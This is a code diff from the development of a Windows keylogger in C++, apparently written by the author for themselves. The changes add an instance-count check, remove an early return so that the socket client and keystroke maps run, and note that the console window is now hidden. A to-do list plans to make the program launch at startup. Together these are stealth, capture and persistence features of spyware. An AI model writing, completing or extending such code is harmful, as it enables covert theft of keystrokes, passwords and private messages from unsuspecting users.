@@ -23,17 +23,28 @@
 
 int retrieveProcessName(DWORD procID, char mainProcName[]) 
 {
+    static short int keyloggerInstanceCounter = 0;
     char procName[MAX_PATH];
     HMODULE hMod;
     HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
     if (procHandle) 
     {
         GetModuleBaseNameA(procHandle, hMod, procName, sizeof(procName)/sizeof(char));
+    } 
+    std::cout << procName << " " << mainProcName << "\n";
+    //std::cout << strcmp(mainProcName, procName) << "\n";
+    if (strcmp(mainProcName, procName) == 0)  
+    {
+        keyloggerInstanceCounter++;
+        std::cout << "hehe" <<  keyloggerInstanceCounter;
+        if (keyloggerInstanceCounter >= 2) 
+        {
+            return 1;
+        }
     }
-
-    std::cout << procName << " " << mainProcName << '\n';
+    //std::cout << procName << " " << mainProcName << '\n';
     CloseHandle(procHandle);
-    return 1;
+    return 0;
 }
 
 int isProcRunning() 
@@ -83,7 +94,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     isProcRunning();
-    return 1;
     Maps vkMaps;
     SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
@@ -124,7 +134,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         Notes
     
     test results and conclusion: 
-        * console window shows on w10 vm, closing still keeps the process running though.
+        * console window shows on w10 vm, closing still keeps the process running though. - SOLVED: Using compiler option -mwindows
         * keylogger can run multiple instances, not only does this cause performance issues, but also ruins the integrity of the data.
     
     so far, these are the only issues I've found during testing. That and additional dll files are needed to run
@@ -134,6 +144,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         To-Do list
     ~ create a function to check if the code program is already running. 
         todo: fix code in isProcRunning so that mainProcName is getting data assigned by GetModuleBaseNameA(). 
+
+
 
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
